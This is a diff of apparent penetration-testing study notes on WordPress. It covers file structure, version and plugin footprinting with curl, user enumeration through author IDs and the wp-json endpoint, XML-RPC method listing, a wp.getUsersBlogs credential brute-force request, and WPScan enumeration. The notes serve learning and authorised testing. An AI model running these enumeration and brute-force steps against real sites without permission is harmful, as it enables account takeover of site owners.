@@ -1,3 +1,54 @@
+# Wordpress FileStructure
+
+```
+$ tree -L 1 /var/www/html
+.
+├── index.php
+├── license.txt
+├── readme.html
+├── wp-activate.php
+├── wp-admin
+├── wp-blog-header.php
+├── wp-comments-post.php
+├── wp-config.php
+├── wp-config-sample.php
+├── wp-content
+├── wp-cron.php
+├── wp-includes
+├── wp-links-opml.php
+├── wp-load.php
+├── wp-login.php
+├── wp-mail.php
+├── wp-settings.php
+├── wp-signup.php
+├── wp-trackback.php
+└── xmlrpc.php
+```
+
+- **index.php** is the homepage of WordPress.
+
+- **license.txt** contains useful information such as the version WordPress installed.
+
+- **wp-activate.php** is used for the email activation process when setting up a new WordPress site.
+
+- wp-admin folder contains the login page for administrator access, could be located at:
+    - /wp-admin/login.php
+    - /wp-admin/wp-login.php
+    - /login.php
+    - /wp-login.php
+
+
+- wp-config.php file contains information required by WordPress to connect to the database
+
+- wp-content is the main directory where plugins and themes are stored
+
+- wp-content/uploads/ is usually where any files uploaded to the platform are stored
+
+
+
+
+
+
 # Discovery/Footprinting
 
 
@@ -42,37 +93,102 @@ $ curl -s http://blog.inlanefreight.local/ | grep plugins
 
 ```
 
+### Version 
+
+`$ curl -s http://wordpress.site | grep generator`
+
+` $ curl -s http://wordpress.site | grep stylesheet`
+
+` $ curl -s http://wordpress.site | grep text/javascript`
+
+
+# Enumerating Plugins/Themes
+
+
+`$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2`
+
+`$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2`
+
+
+# User Enum 
+
+#### Using posts
+
+- find a post and its author
+
+- link could be somethin like `./author/name`
+
+- You could associate the user with his id with something like `curl ./?author=1`
+
+#### JSON endpoint 
+
+`$ curl http://blog.com/wp-json/wp/v2/users | jq`
+
+
+# Login brute force
+
+###  xmlrpc.php page
+
+- Ensure you have access to the xmlrpc.php file in `https://example.com/xmlrpc.php `
+
+- Send the following
+
+```
+POST /xmlrpc.php HTTP/1.1
+Host: example.com
+Content-Length: 135
+
+<?xml version="1.0" encoding="utf-8"?> 
+<methodCall> 
+<methodName>system.listMethods</methodName> 
+<params></params> 
+</methodCall>
+```
+
+- Brute Forcre with  something like
+
+```
+POST /xmlrpc.php HTTP/1.1
+Host: example.com
+Content-Length: 235
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall> 
+<methodName>wp.getUsersBlogs</methodName> 
+<params> 
+<param><value>\{\{your username\}\}</value></param> 
+<param><value>\{\{your password\}\}</value></param> 
+</params> 
+</methodCall>
+```
+
+- Response status will be 200 even with wrong credentials
 
 
 
-# Enumerating Users
-
-
-
-
-    
-
-### WPScan
+# WPScan
 
 `$ sudo gem install wpscan`
 
 
-We can obtain an API token from WPVulnDB, which is used by WPScan to scan for PoC and reports.
+We can obtain an API token from [WPVulnDB](https://wpscan.com/profile/)
 
+### Enumeration
 
-The --enumerate flag is used to enumerate various components of the WordPress application, such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups. However, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments --enumerate ap. Let’s invoke a normal enumeration scan against a WordPress website with the --enumerate flag and pass it an API token from WPVulnDB with the --api-token flag.
+By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups. 
+
+- --enumerate ap to enum all plugins
+- Use the -t flag to specify working thread (default = 5)
 
 `$ sudo wpscan --url http://site.local --enumerate --api-token <SNIP>`
 
-The default number of threads used is 5. However, this value can be changed using the -t flag.
+
 
 
 
 
 ### Login Bruteforce
 
-    
-    
 
 WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john). The tool uses two kinds of login brute force attacks:
 
